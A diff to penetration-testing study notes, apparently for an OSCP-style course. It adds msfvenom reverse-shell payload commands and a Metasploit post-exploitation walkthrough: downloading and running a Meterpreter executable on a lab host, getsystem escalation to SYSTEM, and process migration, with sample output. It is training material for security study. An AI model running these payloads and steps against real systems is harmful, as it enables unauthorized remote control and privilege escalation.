@@ -70,8 +70,8 @@
     **step 1 start an HTTP server for file delivey (if need to download the payload from kali): `python3 -m http.server 80`**  
     **step 2 start a netcat listener (ensure port match the payload): `nc -lvnp 4444`**  
     **step 3 generate payload based on target platform**  
-    - windows32: 'msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=443 -f exe -o shell32.exe'  
-    - windows64: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI>5 LPORT=443 -f exe -o shell64.exe'  
+    - windows32: 'msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=443 -f exe -o shell32.exe`
+    - windows64: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI>5 LPORT=443 -f exe -o shell64.exe`  
     - Linux x86: `msfvenom -p linux/x86/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o shell.elf`  
     - Linux x64: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o shell64.elf`  
     - ASP web shell/vuln upload: `msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f asp -o shell.asp`  
@@ -1911,7 +1911,66 @@ Reference
   msf6 exploit(multi/handler) > run -j
   msf6 exploit(multi/handler) > jobs
   ```
-- ddd 
+
+**Post-Exploitation with metasploit**
+- Create a Windows executable with a Meterpreter reverse shell payload
+  `kali@kali:~$ msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.4 LPORT=443 -f exe -o met.exe`
+- start multi/handler and set options
+  ```
+  msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_https
+  msf6 exploit(multi/handler) > set LPORT 443
+  msf6 exploit(multi/handler) > run
+  ```
+- Connect to CLIENTWK220 and execute met.exe after downloading it 
+  ```
+  kali@kali:~$ nc 192.168.50.223 4444
+  C:\Users\dave> powershell
+  PS C:\Users\dave> iwr -uri http://192.168.119.2/met.exe -Outfile met.exe
+  PS C:\Users\dave> .\met.exe
+
+  [*] Meterpreter session 8 opened (192.168.119.4:443 -> 127.0.0.1)
+  ``` 
+- Display idle time from current user
+  `meterpreter > idletime`
+- Display the assigned privileges to our user in an interactive shell
+  ```
+  meterpreter > shell
+  C:\Users\luiza> whoami /priv
+  ...
+  SeImpersonatePrivilege
+  ```
+- Elevate our privileges with getsystem
+  ```  
+  meterpreter > getsystem
+  meterpreter > getuid
+  ...
+  Server username: NT AUTHORITY\SYSTEM
+  ```
+- Display list of running processe
+  ```
+  meterpreter > ps
+  ...
+  PID    PPID  Name 
+  2552   8500  met.exe
+  8052   4892  OneDrive.exe
+  ```
+- Migrate to explorer.exe
+  ```
+  meterpreter > migrate 8052
+  [*] Migrating from 2552 to 8052... 
+  ```
+- Migrate to a newly spawned Notepad process
+  ```
+  meterpreter > execute -H -f notepad
+  Process 2720 created
+  meterpreter > migrate 2720
+  ```
+- ddd
+- ddd
+- ddd
+
+**Automating metasploit**
+- 
 ### 22. Active directory introduction and enumeration
 ### 23. Attacking active drectiory authentication
 ### 24. Lateral movement in active directory
